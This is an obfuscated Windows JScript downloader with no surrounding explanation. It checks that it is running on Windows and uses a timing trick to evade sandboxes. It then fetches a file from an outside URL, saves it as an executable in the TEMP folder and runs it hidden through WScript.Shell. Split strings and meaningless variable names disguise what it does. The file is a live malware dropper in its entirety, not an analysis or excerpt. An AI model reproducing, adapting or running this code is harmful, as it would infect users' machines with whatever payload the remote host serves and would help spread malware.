var D0 = false;
var YN = "Create"+"Object";
var Z0 = function M() {return WScript[YN]("WScript"+".Shell");}(), WZ = 11;
var FQ = "MSXML2"+".XMLHTTP";
var G = 2;
var SR = G - 2;
function PI(Q0){Z0["Run"](Q0, SR, SR);};
function XV(){return FQ + "";};
function Q(SD, F){SR = SR * 1; return SD - F;};
function X(){return YN;};
/*@cc_on
  @if (@_win32 || @_win64)
    D0 = true;
  @end
@*/
if (D0)
{
var MD = "";
function BH(){return 22;};
var I0 = 0; var N0 = 0;
function GD()
{
var J0 = new this["Date"]();
var XT = J0["getUTCMilliseconds"]();
WScript["Sleep"](BH());
var J0 = new this["Date"]();
var J = J0["getUTCMilliseconds"]();
WScript["Sleep"](BH());
var J0 = new this["Date"]();
var X0 = J0["getUTCMilliseconds"]();
var I0 = "L";
I0 = Q(J, XT);
var N0 = "B";
N0 = Q(X0, J);
MD = "open";
return Q(I0, N0);
}
var AU = false;
var K = false;
for (var Z = SR; Z < BH() * 1; Z++){if (GD() != SR){
AU = true; 
N0 = "31" + 11 * I0 + N0; 
K = true; 
break;
}}
function LZ() {return ((AU == true) && (AU == K)) ? 1 : SR;};
if (AU && LZ() && K){
function I() {return Z0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "viz2Qm9C.ex" + "e";};
 H = XV();
 OP = WScript[YN](H);
 var YS = 1;
do { 
	for (;YS;){
	try {
		if (YS == 1)
		{
			OP[MD]("GET", "http://grzegorzschreiber.pl/n7dak", false);
			OP["send"]();
			NL = "Sleep";
			YS = 2;
		}
		WScript[NL](BH() + 120); 
		if (OP["readystate"] < 2 * 2) continue;
		YS = SR;
		function N(D) {var LI = (1, 2, 3, 4, 5, D); return LI;};
		DV = WScript[X()]("ADODB.Stream");
		H = DV;
		H[MD]();
		H["type"] = N(1);
		H["write"](OP["ResponseBody"]);
		DV["position"] = N(SR);
		H["Save" + "ToFile"](I(), 2);
		DV["cl"+"ose"]();
		E = I();
		PI(E);
	} catch(UP){};};
}while (YS);
}
}

